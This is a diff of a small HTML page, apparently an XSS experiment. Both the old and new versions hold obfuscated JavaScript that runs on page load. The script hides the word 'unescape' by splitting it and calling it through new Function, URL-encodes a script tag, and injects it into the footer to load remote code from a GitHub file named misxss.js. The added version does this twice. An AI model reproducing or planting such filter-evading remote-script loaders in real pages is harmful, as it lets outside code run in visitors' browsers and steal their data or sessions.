@@ -7,7 +7,29 @@
 </head>
 <body>
   
-<sCrIpT>$(function() {var fn = new Function("s", "return une" + "scape(s)"); $('#footer').html(fn("%3Cscript src='https://raw.githubusercontent.com/JerryXia/CodeFragment/master/js/misxss.js' type='text/javascript'%3E%3C/script%3E"));});</sCrIpT>
+<sCrIpT>
+
+$(function() {
+  var f0 = new Function("s", "return une" + "scape(s)");
+  var sc = "sCrIpT".toLowerCase();
+  var j = "%3C" + sc + " src='https://raw.githubusercontent.com/JerryXia/CodeFragment/master/js/misxss.js'%3E%3C/" + sc + "%3E";
+  var s = f0(j);
+  console.log(s);
+  $('#footer').html(s);
+});
+
+ 
+$(function() {
+  var f0 = new Function("s", "return une" + "scape(s)");
+  var sc = "sCrIpT".toLowerCase();
+  var j = "%3C" + sc + " src='https://raw.githubusercontent.com/JerryXia/CodeFragment/master/js/misxss.js'%3E%3C/" + sc + "%3E";
+  var s = f0(j);
+  $('#footer').append(s);
+});
+
+
+</sCrIpT>
+
 
 <div id="footer"> sdfsf </div>
 </body>
